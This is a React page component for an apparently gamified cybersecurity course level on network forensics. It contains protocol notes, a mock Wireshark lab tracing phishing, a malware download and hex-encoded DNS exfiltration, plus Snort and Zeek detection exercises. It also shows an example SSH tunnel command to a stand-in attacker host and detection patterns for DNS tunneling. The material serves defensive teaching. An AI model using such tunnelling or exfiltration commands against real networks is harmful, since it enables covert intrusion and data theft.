import { Navigation } from "@/components/Navigation";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { useState } from "react";
import { Link } from "react-router-dom";
import { Home, ChevronLeft, ChevronRight, Network, Search, Shield, Play, Download } from "lucide-react";

const Level12 = () => {
  const [activeTab, setActiveTab] = useState("overview");
  const [selectedProtocol, setSelectedProtocol] = useState("");
  const [wiresharkStep, setWiresharkStep] = useState(0);
  const [filterInput, setFilterInput] = useState("");
  const [snortRule, setSnortRule] = useState("");
  const [zeekScript, setZeekScript] = useState("");

  const protocols = {
    TCP: "Transmission Control Protocol - Reliable, connection-oriented protocol. Attackers often use TCP for persistent connections to C2 servers.",
    UDP: "User Datagram Protocol - Connectionless protocol. Often abused for DNS tunneling and DDoS amplification attacks.",
    ICMP: "Internet Control Message Protocol - Used for network diagnostics. Can be weaponized for covert channels and exfiltration.",
    DNS: "Domain Name System - Translates domain names to IP addresses. Frequently abused for data exfiltration and C2 communication.",
    HTTPS: "HTTP Secure - Encrypted web traffic. Attackers hide malicious traffic inside legitimate-looking HTTPS connections."
  };

  const packetData = [
    { id: 1, protocol: "HTTP POST", src: "192.168.1.100", dst: "185.199.108.153", info: "POST /login.php HTTP/1.1", suspicious: true },
    { id: 2, protocol: "HTTP GET", src: "192.168.1.100", dst: "malware-cdn.com", info: "GET /payload.exe HTTP/1.1", suspicious: true },
    { id: 3, protocol: "DNS", src: "192.168.1.100", dst: "8.8.8.8", info: "Query: 4d41524b45.malicious.com", suspicious: true },
    { id: 4, protocol: "DNS", src: "192.168.1.100", dst: "8.8.8.8", info: "Query: 434f4e4649.malicious.com", suspicious: true }
  ];

  return (
    <div className="min-h-screen bg-background">
      <Navigation />
      <main className="pt-24 px-4">
        <div className="container mx-auto max-w-6xl">
          <div className="text-center mb-8">
            <div className="mb-4">
              <span className="text-primary text-sm font-semibold">INTERMEDIATE TRACK</span>
            </div>
            <h1 className="text-4xl font-bold mb-4 cyber-gradient">Level 12: Advanced Network Forensics</h1>
            <p className="text-xl text-muted-foreground">Analyze network captures to trace an attacker's every move.</p>
          </div>
          
          <div className="sticky top-20 z-40 glass border border-border/50 rounded-lg p-1 mb-8">
            <div className="flex space-x-1">
              {[
                { id: "overview", label: "1. Overview: The Digital Trail" }, 
                { id: "analyst", label: "2. Analyst Ops: Following the Packets" }, 
                { id: "defensive", label: "3. Defensive Ops: Proactive Hunting" }
              ].map((tab) => (
                <button 
                  key={tab.id} 
                  onClick={() => setActiveTab(tab.id)} 
                  className={`flex-1 px-4 py-2 rounded-md font-medium transition-all ${
                    activeTab === tab.id ? 'bg-primary text-primary-foreground' : 'text-muted-foreground hover:text-foreground'
                  }`}
                >
                  {tab.label}
                </button>
              ))}
            </div>
          </div>

          {activeTab === "overview" && (
            <div className="space-y-8">
              <Card className="glass border-primary/20">
                <CardHeader>
                  <CardTitle className="flex items-center gap-2">
                    <Network className="w-5 h-5 text-primary" />
                    Every Digital Action Leaves a Trail
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <p className="text-lg">Every digital action creates a trail of packets. A forensic analyst's job is to reassemble this trail to tell the complete story of a breach - from initial infection to data exfiltration.</p>
                  
                  <div className="grid md:grid-cols-3 gap-4">
                    {Object.entries(protocols).map(([protocol, description]) => (
                      <div 
                        key={protocol}
                        className={`p-4 border rounded-lg cursor-pointer transition-all ${
                          selectedProtocol === protocol 
                            ? 'border-primary bg-primary/10' 
                            : 'border-border/50 hover:border-primary/50'
                        }`}
                        onClick={() => setSelectedProtocol(protocol)}
                      >
                        <h4 className="font-semibold text-primary mb-2">{protocol}</h4>
                        <p className="text-sm text-muted-foreground">{description}</p>
                      </div>
                    ))}
                  </div>
                  
                  <div className="p-4 bg-yellow-500/10 border border-yellow-500/30 rounded-lg">
                    <h4 className="font-semibold text-yellow-400 mb-3">Protocol Tunneling</h4>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div className="space-y-2">
                        <div className="text-sm font-semibold">What it looks like:</div>
                        <div className="bg-black/50 p-3 rounded font-mono text-xs">
                          <div className="text-green-400">HTTPS Traffic (Port 443)</div>
                          <div>SSL Handshake...</div>
                          <div>Encrypted Data...</div>
                        </div>
                      </div>
                      <div className="space-y-2">
                        <div className="text-sm font-semibold">What's actually inside:</div>
                        <div className="bg-black/50 p-3 rounded font-mono text-xs">
                          <div className="text-red-400">Hidden SSH Tunnel</div>
                          <div>ssh -D 8080 user@attacker.com</div>
                          <div>Malicious traffic tunneled!</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "analyst" && (
            <div className="space-y-8">
              <Card className="glass border-red-500/20">
                <CardHeader>
                  <CardTitle className="text-red-400 flex items-center gap-2">
                    <Search className="w-5 h-5" />
                    Wireshark Forensics Lab
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="p-4 bg-black/50 rounded-lg">
                    <div className="flex items-center gap-4 mb-4">
                      <div className="text-green-400 font-mono">wireshark@forensics:~$</div>
                      <input 
                        type="text"
                        value={filterInput}
                        onChange={(e) => setFilterInput(e.target.value)}
                        placeholder="Enter Wireshark display filter..."
                        className="flex-1 bg-transparent border border-gray-600 rounded px-2 py-1 text-white font-mono"
                      />
                      <Button 
                        onClick={() => {
                          if (filterInput === "http.request.method == \"POST\"" && wiresharkStep === 0) {
                            setWiresharkStep(1);
                          } else if (filterInput === "http contains \".exe\"" && wiresharkStep === 1) {
                            setWiresharkStep(2);
                          } else if (filterInput.includes("ip.addr == ") && wiresharkStep === 2) {
                            setWiresharkStep(3);
                          }
                        }}
                        size="sm"
                      >
                        Apply Filter
                      </Button>
                    </div>
                    
                    <div className="space-y-2">
                      {wiresharkStep === 0 && (
                        <div className="text-yellow-400">
                          💡 Hint: Find the initial phishing attack using HTTP POST method filter
                        </div>
                      )}
                      
                      {packetData
                        .filter(packet => {
                          if (wiresharkStep === 0 && filterInput === "http.request.method == \"POST\"") {
                            return packet.protocol === "HTTP POST";
                          } else if (wiresharkStep === 1 && filterInput === "http contains \".exe\"") {
                            return packet.info.includes(".exe");
                          } else if (wiresharkStep === 2 && filterInput.includes("ip.addr == ")) {
                            return packet.protocol === "DNS";
                          }
                          return wiresharkStep === 0 ? false : true;
                        })
                        .map(packet => (
                          <div key={packet.id} className="grid grid-cols-5 gap-4 p-2 bg-gray-800 rounded text-sm font-mono">
                            <div className="text-white">{packet.protocol}</div>
                            <div className="text-blue-400">{packet.src}</div>
                            <div className="text-green-400">{packet.dst}</div>
                            <div className="text-yellow-400 col-span-2">{packet.info}</div>
                          </div>
                        ))}
                    </div>
                  </div>
                  
                  <div className="space-y-4">
                    {wiresharkStep === 1 && (
                      <div className="p-4 bg-green-500/10 border border-green-500/30 rounded-lg">
                        <div className="text-green-400 font-semibold mb-2">Stage 1 Complete!</div>
                        <p className="text-sm">Found credentials submitted to fake login page. Now find the malware download using: <code>http contains ".exe"</code></p>
                      </div>
                    )}
                    
                    {wiresharkStep === 2 && (
                      <div className="p-4 bg-green-500/10 border border-green-500/30 rounded-lg">
                        <div className="text-green-400 font-semibold mb-2">Stage 2 Complete!</div>
                        <p className="text-sm">Found malware download from malware-cdn.com. Now analyze C2 traffic using: <code>ip.addr == malware-cdn.com</code></p>
                      </div>
                    )}
                    
                    {wiresharkStep === 3 && (
                      <div className="p-4 bg-blue-500/10 border border-blue-500/30 rounded-lg">
                        <div className="text-blue-400 font-semibold mb-2 flex items-center gap-2">
                          <Download className="w-4 h-4" />
                          DNS Exfiltration Detected!
                        </div>
                        <p className="text-sm mb-3">The DNS queries contain hex-encoded data. Click to reconstruct the stolen file:</p>
                        <Button 
                          onClick={() => setWiresharkStep(4)}
                          className="flex items-center gap-2"
                        >
                          <Download className="w-4 h-4" />
                          Reconstruct File
                        </Button>
                      </div>
                    )}
                    
                    {wiresharkStep === 4 && (
                      <div className="p-4 bg-green-500/10 border border-green-500/30 rounded-lg">
                        <div className="text-green-400 font-semibold mb-2">File Carving Complete!</div>
                        <div className="bg-black/50 p-3 rounded font-mono text-sm">
                          <div className="text-green-400">Reconstructed: passwords.zip</div>
                          <div className="text-white">Size: 2,048 bytes</div>
                          <div className="text-yellow-400">Contents: 500+ stolen credentials</div>
                        </div>
                        <div className="text-green-400 font-semibold mt-3">🎯 Investigation Complete! You've traced the full attack chain.</div>
                      </div>
                    )}
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "defensive" && (
            <div className="space-y-8">
              <Card className="glass border-blue-500/20">
                <CardHeader>
                  <CardTitle className="text-blue-400 flex items-center gap-2">
                    <Shield className="w-5 h-5" />
                    Proactive Threat Hunting
                  </CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div className="grid lg:grid-cols-2 gap-6">
                    <div className="space-y-4">
                      <h4 className="font-semibold">Snort IDS Rule</h4>
                      <p className="text-sm text-muted-foreground">Create a rule to detect the malware download pattern:</p>
                      <textarea 
                        value={snortRule}
                        onChange={(e) => setSnortRule(e.target.value)}
                        placeholder="alert tcp any any -> any 80 (msg:&quot;Malware Download&quot;; ...)"
                        className="w-full h-24 bg-black/50 text-green-400 font-mono text-sm p-3 rounded border border-gray-600"
                      />
                      {snortRule.includes("content:&quot;.exe&quot;") && snortRule.includes("User-Agent") && (
                        <div className="p-3 bg-green-500/20 border border-green-500/50 rounded-lg">
                          <div className="text-green-400 font-semibold">✅ Valid Snort Rule!</div>
                        </div>
                      )}
                    </div>
                    
                    <div className="space-y-4">
                      <h4 className="font-semibold">Zeek DNS Analysis Script</h4>
                      <p className="text-sm text-muted-foreground">Write a script to detect DNS tunneling:</p>
                      <textarea 
                        value={zeekScript}
                        onChange={(e) => setZeekScript(e.target.value)}
                        placeholder="@load base/protocols/dns..."
                        className="w-full h-24 bg-black/50 text-green-400 font-mono text-sm p-3 rounded border border-gray-600"
                      />
                      {zeekScript.includes("dns_request") && zeekScript.includes("length") && (
                        <div className="p-3 bg-green-500/20 border border-green-500/50 rounded-lg">
                          <div className="text-green-400 font-semibold">✅ Valid Zeek Script!</div>
                        </div>
                      )}
                    </div>
                  </div>
                  
                  <div className="p-4 bg-blue-500/10 border border-blue-500/30 rounded-lg">
                    <h4 className="font-semibold text-blue-400 mb-3">Example DNS Tunneling Detection</h4>
                    <div className="bg-black/50 p-3 rounded font-mono text-xs">
                      <div className="text-green-400">event dns_request(c: connection, msg: dns_msg, query: string)</div>
                      <div className="text-white ml-4">{`{`}</div>
                      <div className="text-white ml-8">if ({"|"}query{"|"} {`>`} 50 {`&&`} /[0-9a-f]{`{10,}`}/ in query)</div>
                      <div className="text-white ml-12">NOTICE([{`"`}DNS tunneling detected{`"`}]);</div>
                      <div className="text-white ml-4">{`}`}</div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          <div className="flex justify-between items-center py-8">
            <Button asChild variant="cyber-ghost" size="lg">
              <Link to="/level/11re" className="flex items-center gap-2">
                <ChevronLeft className="w-4 h-4" />
                Previous
              </Link>
            </Button>
            <Button asChild variant="cyber-ghost" size="lg">
              <Link to="/" className="flex items-center gap-2">
                <Home className="w-4 h-4" />
                Home
              </Link>
            </Button>
            <Button asChild variant="cyber" size="lg">
              <Link to="/level/13" className="flex items-center gap-2">
                Next Level
                <ChevronRight className="w-4 h-4" />
              </Link>
            </Button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Level12;